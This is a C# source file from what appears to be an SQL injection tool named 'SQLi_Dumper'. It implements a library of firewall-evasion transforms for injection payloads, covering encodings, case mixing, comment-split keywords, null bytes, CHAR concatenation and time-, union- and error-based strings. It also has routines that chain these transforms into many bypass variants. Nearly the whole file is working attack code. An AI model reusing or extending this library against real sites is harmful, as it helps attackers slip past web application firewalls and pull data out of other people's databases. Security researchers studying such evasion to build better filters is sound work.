using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;

namespace SQLi_Dumper.Core
{
    /// <summary>
    /// Comprehensive WAF (Web Application Firewall) bypass techniques and evasion methods
    /// </summary>
    public static class WAFBypass
    {
        /// <summary>
        /// WAF bypass technique categories
        /// </summary>
        public enum BypassCategory
        {
            Encoding,
            CaseManipulation,
            Comments,
            Whitespace,
            Operators,
            Functions,
            Keywords,
            Concatenation,
            Unicode,
            Double_Encoding,
            Null_Bytes,
            Special_Characters,
            Time_Based,
            Blind_Boolean,
            Union_Based,
            Error_Based
        }

        /// <summary>
        /// WAF bypass technique structure
        /// </summary>
        public class BypassTechnique
        {
            public string Name { get; set; }
            public BypassCategory Category { get; set; }
            public string Description { get; set; }
            public Func<string, string> Transform { get; set; }
            public DbTypes.DatabaseFamily[] SupportedDatabases { get; set; }
            public string[] ExamplePayloads { get; set; }

            public BypassTechnique(string name, BypassCategory category, string description,
                                 Func<string, string> transform, DbTypes.DatabaseFamily[] supportedDatabases,
                                 string[] examplePayloads = null)
            {
                Name = name;
                Category = category;
                Description = description;
                Transform = transform;
                SupportedDatabases = supportedDatabases ?? new DbTypes.DatabaseFamily[0];
                ExamplePayloads = examplePayloads ?? new string[0];
            }
        }

        /// <summary>
        /// All supported database families
        /// </summary>
        private static readonly DbTypes.DatabaseFamily[] AllDatabases = 
        {
            DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle,
            DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.SQLite, DbTypes.DatabaseFamily.MongoDB,
            DbTypes.DatabaseFamily.DB2, DbTypes.DatabaseFamily.Firebird, DbTypes.DatabaseFamily.Informix,
            DbTypes.DatabaseFamily.MariaDB, DbTypes.DatabaseFamily.Sybase, DbTypes.DatabaseFamily.MsAccess
        };

        /// <summary>
        /// SQL-based databases (excluding NoSQL)
        /// </summary>
        private static readonly DbTypes.DatabaseFamily[] SQLDatabases = 
        {
            DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.Oracle,
            DbTypes.DatabaseFamily.PostgreSQL, DbTypes.DatabaseFamily.SQLite, DbTypes.DatabaseFamily.DB2,
            DbTypes.DatabaseFamily.Firebird, DbTypes.DatabaseFamily.Informix, DbTypes.DatabaseFamily.MariaDB,
            DbTypes.DatabaseFamily.Sybase, DbTypes.DatabaseFamily.MsAccess
        };

        /// <summary>
        /// Collection of WAF bypass techniques
        /// </summary>
        public static readonly List<BypassTechnique> BypassTechniques = new List<BypassTechnique>
        {
            // Encoding techniques
            new BypassTechnique("URL Encoding", BypassCategory.Encoding, "URL encode special characters",
                payload => HttpUtility.UrlEncode(payload), AllDatabases,
                new[] { "SELECT * FROM users WHERE id = %271%27", "UNION%20SELECT%20NULL" }),

            new BypassTechnique("HTML Entity Encoding", BypassCategory.Encoding, "HTML entity encode characters",
                payload => HttpUtility.HtmlEncode(payload), AllDatabases,
                new[] { "SELECT * FROM users WHERE id = &#39;1&#39;", "UNION&#32;SELECT&#32;NULL" }),

            new BypassTechnique("Hex Encoding", BypassCategory.Encoding, "Hex encode string literals",
                payload => ConvertToHex(payload), new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                new[] { "SELECT 0x61646d696e", "UNION SELECT 0x31" }),

            new BypassTechnique("Double URL Encoding", BypassCategory.Double_Encoding, "Double URL encode payload",
                payload => HttpUtility.UrlEncode(HttpUtility.UrlEncode(payload)), AllDatabases,
                new[] { "SELECT%2520*%2520FROM%2520users", "%2527%2520UNION%2520SELECT%2520NULL" }),

            new BypassTechnique("Base64 Encoding", BypassCategory.Encoding, "Base64 encode payload segments",
                payload => Convert.ToBase64String(Encoding.UTF8.GetBytes(payload)), AllDatabases,
                new[] { "SELECT FROM_BASE64('U0VMRUNUICog')", "UNION SELECT DECODE('dW5pb24=')" }),

            // Case manipulation
            new BypassTechnique("Mixed Case", BypassCategory.CaseManipulation, "Randomize case of keywords",
                payload => RandomizeCase(payload), SQLDatabases,
                new[] { "SeLeCt * FrOm UsErS", "uNiOn SeLeCt NuLl" }),

            new BypassTechnique("Alternate Case", BypassCategory.CaseManipulation, "Alternate upper/lower case",
                payload => AlternateCase(payload), SQLDatabases,
                new[] { "sElEcT * fRoM uSeRs", "UnIoN sElEcT nUlL" }),

            // Comment techniques
            new BypassTechnique("Inline Comments", BypassCategory.Comments, "Insert inline comments",
                payload => InsertInlineComments(payload), SQLDatabases,
                new[] { "SELECT/**/username/**/FROM/**/users", "UNION/**/SELECT/**/NULL" }),

            new BypassTechnique("Multi-line Comments", BypassCategory.Comments, "Use multi-line comments",
                payload => InsertMultilineComments(payload), SQLDatabases,
                new[] { "SELECT/*comment*/username/**/FROM/**/users", "UNION/*bypass*/SELECT/**/NULL" }),

            new BypassTechnique("Hash Comments", BypassCategory.Comments, "Use hash-style comments",
                payload => payload + " # comment", new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                new[] { "SELECT * FROM users WHERE id = 1 # comment", "UNION SELECT NULL # bypass" }),

            new BypassTechnique("Double Dash Comments", BypassCategory.Comments, "Use double dash comments",
                payload => payload + " -- comment", SQLDatabases,
                new[] { "SELECT * FROM users WHERE id = 1 -- comment", "UNION SELECT NULL -- bypass" }),

            // Whitespace techniques
            new BypassTechnique("Tab Replacement", BypassCategory.Whitespace, "Replace spaces with tabs",
                payload => payload.Replace(" ", "\t"), SQLDatabases,
                new[] { "SELECT\t*\tFROM\tusers", "UNION\tSELECT\tNULL" }),

            new BypassTechnique("Newline Replacement", BypassCategory.Whitespace, "Replace spaces with newlines",
                payload => payload.Replace(" ", "\n"), SQLDatabases,
                new[] { "SELECT\n*\nFROM\nusers", "UNION\nSELECT\nNULL" }),

            new BypassTechnique("Multiple Spaces", BypassCategory.Whitespace, "Use multiple spaces",
                payload => Regex.Replace(payload, @"\s+", "  "), SQLDatabases,
                new[] { "SELECT  *  FROM  users", "UNION  SELECT  NULL" }),

            new BypassTechnique("Form Feed", BypassCategory.Whitespace, "Use form feed character",
                payload => payload.Replace(" ", "\f"), SQLDatabases,
                new[] { "SELECT\f*\fFROM\fusers", "UNION\fSELECT\fNULL" }),

            // Operator techniques
            new BypassTechnique("Operator Substitution", BypassCategory.Operators, "Substitute operators",
                payload => SubstituteOperators(payload), SQLDatabases,
                new[] { "SELECT * FROM users WHERE id LIKE 1", "SELECT * FROM users WHERE id REGEXP '^1$'" }),

            new BypassTechnique("Logical Operators", BypassCategory.Operators, "Use logical operators",
                payload => payload.Replace("AND", "&&").Replace("OR", "||"), 
                new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                new[] { "SELECT * FROM users WHERE id = 1 && name = 'admin'", "1 || 2" }),

            // Function techniques
            new BypassTechnique("Function Obfuscation", BypassCategory.Functions, "Obfuscate function calls",
                payload => ObfuscateFunctions(payload), SQLDatabases,
                new[] { "SELECT CHAR(97,100,109,105,110)", "SELECT CONCAT(CHAR(97),CHAR(100))" }),

            new BypassTechnique("String Functions", BypassCategory.Functions, "Use string manipulation functions",
                payload => UseStringFunctions(payload), SQLDatabases,
                new[] { "SELECT SUBSTRING('admin',1,1)", "SELECT LEFT('admin',2)" }),

            // Keyword techniques
            new BypassTechnique("Keyword Splitting", BypassCategory.Keywords, "Split keywords with comments",
                payload => SplitKeywords(payload), SQLDatabases,
                new[] { "SEL/**/ECT * FROM users", "UN/**/ION SEL/**/ECT NULL" }),

            new BypassTechnique("Keyword Substitution", BypassCategory.Keywords, "Substitute keywords",
                payload => SubstituteKeywords(payload), SQLDatabases,
                new[] { "SELECT * FROM users WHERE id = 1 GROUP BY id HAVING id = 1", "SELECT * FROM (SELECT * FROM users) AS t" }),

            // Concatenation techniques
            new BypassTechnique("String Concatenation", BypassCategory.Concatenation, "Break strings using concatenation",
                payload => ConcatenateStrings(payload), SQLDatabases,
                new[] { "SELECT CONCAT('ad','min')", "SELECT 'ad'||'min'" }),

            new BypassTechnique("Char Concatenation", BypassCategory.Concatenation, "Use CHAR() concatenation",
                payload => ConvertToCharConcatenation(payload), 
                new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MSSQL, DbTypes.DatabaseFamily.MariaDB },
                new[] { "SELECT CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)", "CHAR(97,100,109,105,110)" }),

            // Unicode techniques
            new BypassTechnique("Unicode Encoding", BypassCategory.Unicode, "Use Unicode encoding",
                payload => UnicodeEncode(payload), AllDatabases,
                new[] { "SELECT \\u0061\\u0064\\u006d\\u0069\\u006e", "\\u0053\\u0045\\u004c\\u0045\\u0043\\u0054" }),

            new BypassTechnique("Unicode Normalization", BypassCategory.Unicode, "Normalize Unicode characters",
                payload => NormalizeUnicode(payload), AllDatabases,
                new[] { "SELECT * FROM users WHERE id = １", "ＵＮＩＯＮ ＳＥＬＥＣＴ ＮＵＬＬ" }),

            // Null byte techniques
            new BypassTechnique("Null Byte Injection", BypassCategory.Null_Bytes, "Insert null bytes",
                payload => payload.Replace(" ", "\0 "), AllDatabases,
                new[] { "SELECT\0*\0FROM\0users", "UNION\0SELECT\0NULL" }),

            // Special character techniques
            new BypassTechnique("Special Character Substitution", BypassCategory.Special_Characters, "Use special characters",
                payload => SubstituteSpecialChars(payload), SQLDatabases,
                new[] { "SELECT*FROM/**/users", "SELECT(*)FROM(users)" }),

            new BypassTechnique("Backtick Identifiers", BypassCategory.Special_Characters, "Use backtick identifiers",
                payload => UseBacktickIdentifiers(payload), new[] { DbTypes.DatabaseFamily.MySQL, DbTypes.DatabaseFamily.MariaDB },
                new[] { "SELECT * FROM `users`", "SELECT `username` FROM `users`" }),

            // Time-based techniques
            new BypassTechnique("Time Delay Obfuscation", BypassCategory.Time_Based, "Obfuscate time delays",
                payload => ObfuscateTimeDelays(payload), SQLDatabases,
                new[] { "SELECT SLEEP(5)", "SELECT pg_sleep(5)", "WAITFOR DELAY '00:00:05'" }),

            // Boolean-based techniques
            new BypassTechnique("Boolean Obfuscation", BypassCategory.Blind_Boolean, "Obfuscate boolean conditions",
                payload => ObfuscateBooleans(payload), SQLDatabases,
                new[] { "SELECT * FROM users WHERE 1=1", "SELECT * FROM users WHERE 'a'='a'" }),

            // Union-based techniques
            new BypassTechnique("Union Obfuscation", BypassCategory.Union_Based, "Obfuscate UNION statements",
                payload => ObfuscateUnion(payload), SQLDatabases,
                new[] { "SELECT * FROM users UNION ALL SELECT NULL", "SELECT * FROM users UNION DISTINCT SELECT NULL" }),

            // Error-based techniques
            new BypassTechnique("Error Generation", BypassCategory.Error_Based, "Generate deliberate errors",
                payload => GenerateErrors(payload), SQLDatabases,
                new[] { "SELECT * FROM users WHERE id = 1 AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x) = 1",
                       "SELECT * FROM users WHERE id = 1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))" })
        };

        /// <summary>
        /// Apply multiple bypass techniques to a payload
        /// </summary>
        /// <param name="payload">Original payload</param>
        /// <param name="techniques">List of techniques to apply</param>
        /// <param name="database">Target database family</param>
        /// <returns>List of transformed payloads</returns>
        public static List<string> ApplyBypassTechniques(string payload, List<BypassCategory> techniques, DbTypes.DatabaseFamily database)
        {
            var results = new List<string>();
            
            foreach (var category in techniques)
            {
                var applicableTechniques = BypassTechniques.Where(t => 
                    t.Category == category && 
                    (t.SupportedDatabases.Length == 0 || t.SupportedDatabases.Contains(database)))
                    .ToList();

                foreach (var technique in applicableTechniques)
                {
                    try
                    {
                        string transformed = technique.Transform(payload);
                        if (!string.IsNullOrEmpty(transformed) && transformed != payload)
                        {
                            results.Add(transformed);
                        }
                    }
                    catch (Exception)
                    {
                        // Skip techniques that fail
                        continue;
                    }
                }
            }

            return results.Distinct().ToList();
        }

        /// <summary>
        /// Get all bypass techniques for a specific database
        /// </summary>
        /// <param name="database">Database family</param>
        /// <returns>List of applicable techniques</returns>
        public static List<BypassTechnique> GetTechniquesForDatabase(DbTypes.DatabaseFamily database)
        {
            return BypassTechniques.Where(t => 
                t.SupportedDatabases.Length == 0 || 
                t.SupportedDatabases.Contains(database)).ToList();
        }

        /// <summary>
        /// Generate comprehensive bypass payload variations
        /// </summary>
        /// <param name="payload">Base payload</param>
        /// <param name="database">Target database</param>
        /// <param name="maxVariations">Maximum number of variations to generate</param>
        /// <returns>List of payload variations</returns>
        public static List<string> GenerateBypassVariations(string payload, DbTypes.DatabaseFamily database, int maxVariations = 50)
        {
            var variations = new List<string> { payload };
            var applicableTechniques = GetTechniquesForDatabase(database);
            
            // Apply single techniques
            foreach (var technique in applicableTechniques.Take(maxVariations / 2))
            {
                try
                {
                    string transformed = technique.Transform(payload);
                    if (!string.IsNullOrEmpty(transformed) && !variations.Contains(transformed))
                    {
                        variations.Add(transformed);
                    }
                }
                catch (Exception)
                {
                    continue;
                }
            }

            // Apply combinations of techniques
            var combinationTechniques = applicableTechniques.Take(5).ToList();
            foreach (var tech1 in combinationTechniques)
            {
                foreach (var tech2 in combinationTechniques.Where(t => t != tech1))
                {
                    try
                    {
                        string transformed = tech2.Transform(tech1.Transform(payload));
                        if (!string.IsNullOrEmpty(transformed) && !variations.Contains(transformed))
                        {
                            variations.Add(transformed);
                        }
                        
                        if (variations.Count >= maxVariations)
                            break;
                    }
                    catch (Exception)
                    {
                        continue;
                    }
                }
                if (variations.Count >= maxVariations)
                    break;
            }

            return variations.Take(maxVariations).ToList();
        }

        /// <summary>
        /// Check if payload contains common WAF trigger words
        /// </summary>
        /// <param name="payload">Payload to check</param>
        /// <returns>True if contains trigger words</returns>
        public static bool ContainsWAFTriggers(string payload)
        {
            var triggers = new[]
            {
                "union", "select", "insert", "update", "delete", "drop", "create", "alter",
                "exec", "execute", "script", "javascript", "vbscript", "onload", "onerror",
                "iframe", "object", "embed", "form", "input", "textarea", "button"
            };

            string lowerPayload = payload.ToLower();
            return triggers.Any(trigger => lowerPayload.Contains(trigger));
        }

        #region Private Helper Methods

        private static string ConvertToHex(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            var hex = new StringBuilder();
            foreach (char c in input)
            {
                hex.Append(((int)c).ToString("X2"));
            }
            return "0x" + hex.ToString();
        }

        private static string RandomizeCase(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            var random = new Random();
            var result = new StringBuilder();
            
            foreach (char c in input)
            {
                if (char.IsLetter(c))
                {
                    result.Append(random.Next(2) == 0 ? char.ToLower(c) : char.ToUpper(c));
                }
                else
                {
                    result.Append(c);
                }
            }
            
            return result.ToString();
        }

        private static string AlternateCase(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            var result = new StringBuilder();
            bool isUpper = false;
            
            foreach (char c in input)
            {
                if (char.IsLetter(c))
                {
                    result.Append(isUpper ? char.ToUpper(c) : char.ToLower(c));
                    isUpper = !isUpper;
                }
                else
                {
                    result.Append(c);
                }
            }
            
            return result.ToString();
        }

        private static string InsertInlineComments(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            return input.Replace(" ", "/**/ ");
        }

        private static string InsertMultilineComments(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            return input.Replace(" ", "/*comment*/ ");
        }

        private static string SubstituteOperators(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace("=", " LIKE ")
                       .Replace("!=", " NOT LIKE ")
                       .Replace("<>", " NOT LIKE ");
        }

        private static string ObfuscateFunctions(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace("USER()", "CURRENT_USER")
                       .Replace("VERSION()", "@@VERSION")
                       .Replace("DATABASE()", "SCHEMA()");
        }

        private static string UseStringFunctions(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            // Replace string literals with function calls
            return Regex.Replace(input, @"'([^']*)'", match =>
            {
                string value = match.Groups[1].Value;
                if (value.Length <= 1) return match.Value;
                
                return $"CONCAT('{value[0]}','{value.Substring(1)}')";
            });
        }

        private static string SplitKeywords(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace("SELECT", "SEL/**/ECT")
                       .Replace("UNION", "UN/**/ION")
                       .Replace("WHERE", "WH/**/ERE")
                       .Replace("FROM", "FR/**/OM");
        }

        private static string SubstituteKeywords(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            // This is a simplified substitution - in practice, you'd need more complex logic
            return input.Replace("SELECT *", "SELECT 1,2,3,4,5,6,7,8,9,10");
        }

        private static string ConcatenateStrings(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return Regex.Replace(input, @"'([^']{2,})'", match =>
            {
                string value = match.Groups[1].Value;
                if (value.Length <= 2) return match.Value;
                
                int mid = value.Length / 2;
                return $"CONCAT('{value.Substring(0, mid)}','{value.Substring(mid)}')";
            });
        }

        private static string ConvertToCharConcatenation(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return Regex.Replace(input, @"'([^']*)'", match =>
            {
                string value = match.Groups[1].Value;
                if (string.IsNullOrEmpty(value)) return match.Value;
                
                var charCodes = value.Select(c => ((int)c).ToString()).ToArray();
                return $"CHAR({string.Join(",", charCodes)})";
            });
        }

        private static string UnicodeEncode(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            var result = new StringBuilder();
            foreach (char c in input)
            {
                if (char.IsLetterOrDigit(c))
                {
                    result.Append($"\\u{((int)c):X4}");
                }
                else
                {
                    result.Append(c);
                }
            }
            return result.ToString();
        }

        private static string NormalizeUnicode(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            // Convert to full-width characters (basic example)
            var result = new StringBuilder();
            foreach (char c in input)
            {
                if (c >= 'A' && c <= 'Z')
                {
                    result.Append((char)(c - 'A' + 'Ａ'));
                }
                else if (c >= 'a' && c <= 'z')
                {
                    result.Append((char)(c - 'a' + 'ａ'));
                }
                else if (c >= '0' && c <= '9')
                {
                    result.Append((char)(c - '0' + '０'));
                }
                else
                {
                    result.Append(c);
                }
            }
            return result.ToString();
        }

        private static string SubstituteSpecialChars(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace(" ", "/**/")
                       .Replace("(", "/**/(" )
                       .Replace(")", ")/**/");
        }

        private static string UseBacktickIdentifiers(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return Regex.Replace(input, @"\b([a-zA-Z_][a-zA-Z0-9_]*)\b", "`$1`");
        }

        private static string ObfuscateTimeDelays(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace("SLEEP(5)", "SLEEP(2+3)")
                       .Replace("pg_sleep(5)", "pg_sleep(2+3)")
                       .Replace("WAITFOR DELAY '00:00:05'", "WAITFOR DELAY '00:00:02'; WAITFOR DELAY '00:00:03'");
        }

        private static string ObfuscateBooleans(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace("1=1", "2>1")
                       .Replace("1=0", "1>2")
                       .Replace("TRUE", "1=1")
                       .Replace("FALSE", "1=0");
        }

        private static string ObfuscateUnion(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            return input.Replace("UNION SELECT", "UNION ALL SELECT")
                       .Replace("UNION ALL SELECT", "UNION DISTINCT SELECT");
        }

        private static string GenerateErrors(string input)
        {
            if (string.IsNullOrEmpty(input)) return input;
            
            // Add error-inducing conditions
            return input + " AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY x) = 1";
        }

        #endregion
    }
}